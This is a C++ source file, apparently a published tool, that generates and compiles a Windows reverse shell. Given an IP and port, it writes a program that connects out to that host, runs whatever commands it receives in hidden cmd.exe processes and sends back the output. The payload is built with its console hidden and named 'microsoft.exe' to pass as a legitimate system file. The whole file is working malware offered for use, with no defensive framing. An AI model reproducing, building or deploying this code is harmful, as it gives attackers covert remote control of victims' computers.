#include <iostream>
#include <fstream>
#include <string>

using namespace std;

int main(int argc, char *argv[]) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " <IP> <Port> " << endl;
        return 1;
    }

    string ip = argv[1];
    string port = argv[2];

    // Generate the new C++ source code
    string new_source =
        "#include <iostream>\n"
        "#include <string>\n"
        "#include <windows.h>\n"
        "#include <winsock2.h>\n"
        "#include <ws2tcpip.h>\n"
        "#include <direct.h>\n\n"
        "#pragma comment(lib, \"Ws2_32.lib\")\n\n"
        "using namespace std;\n\n"
        "string execute_command_silently(const string &cmd) {\n"
        "    string result;\n"
        "    HANDLE hPipeRead, hPipeWrite;\n"
        "    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };\n"
        "    saAttr.bInheritHandle = TRUE;\n"
        "    saAttr.lpSecurityDescriptor = NULL;\n\n"
        "    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {\n"
        "        return \"Error: Unable to create pipe\\n\";\n"
        "    }\n\n"
        "    SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);\n\n"
        "    PROCESS_INFORMATION pi = { 0 };\n"
        "    STARTUPINFO si = { sizeof(STARTUPINFO) };\n"
        "    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;\n"
        "    si.hStdOutput = hPipeWrite;\n"
        "    si.hStdError = hPipeWrite;\n"
        "    si.wShowWindow = SW_HIDE;\n\n"
        "    string cmdLine = \"cmd /c \" + cmd;\n"
        "    if (!CreateProcess(NULL, const_cast<LPSTR>(cmdLine.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {\n"
        "        CloseHandle(hPipeWrite);\n"
        "        CloseHandle(hPipeRead);\n"
        "        return \"Error: Unable to execute command\\n\";\n"
        "    }\n\n"
        "    CloseHandle(hPipeWrite);\n\n"
        "    char buffer[128];\n"
        "    DWORD bytesRead;\n"
        "    while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {\n"
        "        buffer[bytesRead] = '\\0';\n"
        "        result += buffer;\n"
        "    }\n\n"
        "    CloseHandle(hPipeRead);\n"
        "    CloseHandle(pi.hProcess);\n"
        "    CloseHandle(pi.hThread);\n\n"
        "    return result;\n"
        "}\n\n"
        "int main() {\n"
        "    string ip = \"" + ip + "\";\n"
        "    int port = " + port + ";\n\n"
        "    WSADATA wsaData;\n"
        "    SOCKET sock = INVALID_SOCKET;\n"
        "    struct sockaddr_in server_addr;\n\n"
        "    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\n"
        "        return 1;\n"
        "    }\n\n"
        "    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n"
        "    if (sock == INVALID_SOCKET) {\n"
        "        WSACleanup();\n"
        "        return 1;\n"
        "    }\n\n"
        "    server_addr.sin_family = AF_INET;\n"
        "    server_addr.sin_port = htons(port);\n"
        "    server_addr.sin_addr.s_addr = inet_addr(ip.c_str());\n"
        "    if (server_addr.sin_addr.s_addr == INADDR_NONE) {\n"
        "        closesocket(sock);\n"
        "        WSACleanup();\n"
        "        return 1;\n"
        "    }\n\n"
        "    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {\n"
        "        closesocket(sock);\n"
        "        WSACleanup();\n"
        "        return 1;\n"
        "    }\n\n"
        "    char recvbuf[1024];\n"
        "    int recvbuflen = 1024;\n\n"
        "    while (true) {\n"
        "        char cwd[1024];\n"
        "        _getcwd(cwd, sizeof(cwd));\n"
        "        string current_dir = string(cwd) + \"> \";\n"
        "        send(sock, current_dir.c_str(), current_dir.length(), 0);\n\n"
        "        int result = recv(sock, recvbuf, recvbuflen, 0);\n"
        "        if (result > 0) {\n"
        "            string command(recvbuf, result);\n\n"
        "            if (command == \"exit\") {\n"
        "                send(sock, \"Exiting...\\n\", 11, 0);\n"
        "                break;\n"
        "            }\n\n"
        "            command = command.substr(0, command.find_last_not_of(\" \\n\\r\\t\") + 1);\n\n"
        "            if (command == \"cd\") {\n"
        "                _chdir(getenv(\"HOMEPATH\"));\n"
        "            } else if (command.substr(0, 3) == \"cd \") {\n"
        "                string dir = command.substr(3);\n"
        "                if (_chdir(dir.c_str()) != 0) {\n"
        "                    string error_msg = \"Error changing directory.\\n\";\n"
        "                    send(sock, error_msg.c_str(), error_msg.length(), 0);\n"
        "                }\n"
        "            } else {\n"
        "                string result_str = execute_command_silently(command);\n"
        "                send(sock, result_str.c_str(), result_str.length(), 0);\n"
        "            }\n"
        "        } else if (result == 0) {\n"
        "            break;\n"
        "        } else {\n"
        "            break;\n"
        "        }\n"
        "    }\n\n"
        "    closesocket(sock);\n"
        "    WSACleanup();\n"
        "    return 0;\n"
        "}\n";

    // Write the new source to a file
    ofstream ofs("child.cpp");
    ofs << new_source;
    ofs.close();

    // Compile the new program using g++ and link with ws2_32, also set subsystem to windows to hide the console
    system("g++ child.cpp -o microsoft.exe -lws2_32 -mwindows");

    // Inform the user
    cout << "Generated new executable 'microsoft.exe' with hardcoded IP "+ip + " and Port "+ port << endl;
    cout <<"Thanks this tool written by github.com/salehalthini";
    return 0;
}
